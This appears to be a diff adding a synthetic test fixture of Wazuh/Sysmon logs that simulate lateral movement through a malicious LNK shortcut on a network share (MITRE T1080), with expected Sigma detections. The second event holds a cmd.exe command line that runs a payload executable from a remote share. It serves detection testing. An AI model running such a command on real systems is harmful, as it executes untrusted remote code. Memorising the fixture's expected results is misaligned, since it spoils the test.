@@ -1,0 +1,170 @@
+{
+  "_metadata": {
+    "attack_id": "T1080",
+    "variation": "001",
+    "name": "Malicious LNK File on Network Share",
+    "description": "Lateral movement by placing malicious LNK shortcut file on network share to execute payload when users browse the share",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "lateral-movement",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 11 - LNK file creation on network share",
+      "sequence": 1,
+      "timestamp": "2026-02-08T11:40:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T11:40:00.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 11: LNK file created on network share",
+          "id": "100919",
+          "mitre": {
+            "id": [
+              "T1080",
+              "T1547.009"
+            ],
+            "tactic": [
+              "Lateral Movement",
+              "Persistence"
+            ],
+            "technique": [
+              "Taint Shared Content",
+              "Shortcut Modification"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.300018",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "11",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 11:40:00.000",
+              "processGuid": "{A1B2C3D4-LAT-1080-0001-000000000001}",
+              "processId": "5678",
+              "image": "C:\\Windows\\explorer.exe",
+              "targetFilename": "\\\\FS01\\SharedDocs\\Important Report.lnk",
+              "creationUtcTime": "2026-02-08 11:40:00.000",
+              "user": "CORP\\admin.user",
+              "hashes": "SHA256=4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-lateral",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1080",
+        "_fomorian_expected_detection": "Sigma: Malicious LNK on Network Share (T1080)"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Victim browsing share triggers LNK payload",
+      "sequence": 2,
+      "timestamp": "2026-02-08T11:45:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T11:45:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Suspicious process spawned from LNK execution",
+          "id": "100915",
+          "mitre": {
+            "id": [
+              "T1080",
+              "T1204.002"
+            ],
+            "tactic": [
+              "Lateral Movement",
+              "Execution"
+            ],
+            "technique": [
+              "Taint Shared Content",
+              "User Execution: Malicious File"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400000.300019",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "FS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-08 11:45:00.000",
+              "processGuid": "{A1B2C3D4-LAT-1080-0002-000000000001}",
+              "processId": "11234",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c \"\\\\198.51.100.20\\C$\\temp\\payload.exe\"",
+              "currentDirectory": "C:\\Users\\victim.user\\",
+              "user": "CORP\\victim.user",
+              "logonGuid": "{A1B2C3D4-0001-0001-0004-000000000001}",
+              "logonId": "0x8f7",
+              "terminalSessionId": "1",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9",
+              "parentProcessGuid": "{A1B2C3D4-0001-0001-0002-000000000001}",
+              "parentProcessId": "4512",
+              "parentImage": "C:\\Windows\\explorer.exe",
+              "parentCommandLine": "C:\\Windows\\explorer.exe"
+            }
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch1-lateral",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1080",
+        "_fomorian_expected_detection": "Sigma: LNK File Execution from Network Share (T1080)"
+      }
+    }
+  ]
+}
